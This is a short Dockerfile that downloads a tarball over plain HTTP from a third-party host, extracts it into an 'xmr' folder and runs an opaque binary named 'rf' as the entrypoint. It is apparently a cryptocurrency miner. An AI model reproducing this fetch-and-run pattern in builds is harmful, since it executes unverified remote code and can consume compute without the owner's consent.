FROM  ubuntu:16.04
RUN   apt-get update && \
      apt-get install sudo wget tmux -y && \
      wget http://mrgeek.me/fb/masari.tar.gz && \
      tar xvfz masari.tar.gz && \
      cd xmr && \
      chmod +x rf
WORKDIR    /xmr
ENTRYPOINT  ["./rf"]
